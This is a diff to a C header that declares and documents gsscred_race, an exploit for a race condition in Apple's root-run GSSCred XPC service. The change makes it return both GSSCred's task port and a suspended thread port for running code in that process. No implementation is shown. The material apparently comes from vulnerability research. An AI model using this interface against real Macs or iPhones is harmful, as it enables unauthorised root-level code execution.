@@ -10,6 +10,7 @@
 
 #include <mach/mach.h>
 #include <stdarg.h>
+#include <stdbool.h>
 
 /*
  * gsscred_race_log
@@ -44,13 +45,28 @@ extern void (*gsscred_race_log)(char type, const char *format, va_list ap);
  * 	Exploit a race condition in the com.apple.GSSCred XPC service in order to access GSSCred's
  * 	task port. GSSCred runs as root on macOS and iOS.
  *
+ * Parameters:
+ * 	gsscred_task_port		On return, contains the task port for GSSCred. Note that
+ * 					this port's usage may be restricted on some platforms,
+ * 					including iOS 11.
+ * 	gsscred_thread_port		On return, contains the thread port for a thread in
+ * 					GSSCred. This thread port can be used to execute code
+ * 					within the GSSCred process. The thread is returned
+ * 					suspended.
+ *
  * Returns:
- * 	Returns GSSCred's task port on success or MACH_PORT_NULL on failure.
+ * 	Returns true if GSSCred's task port and thread port were both successfully retrieved.
+ * 	Otherwise, returns false and both ports are set to MACH_PORT_NULL.
  *
  * Logging:
  * 	Many error conditions may be encountered by gsscred_race during its execution. Error
  * 	messages are logged using the gsscred_race_log function pointer described above.
+ *
+ * Notes:
+ * 	The race condition can only safely be exploited once during the lifetime of the GSSCred
+ * 	process. Subsequent attempts to exploit the vulnerability will probably fail and may cause
+ * 	instability.
  */
-mach_port_t gsscred_race(void);
+bool gsscred_race(mach_port_t *gsscred_task_port, mach_port_t *gsscred_thread_port);
 
 #endif
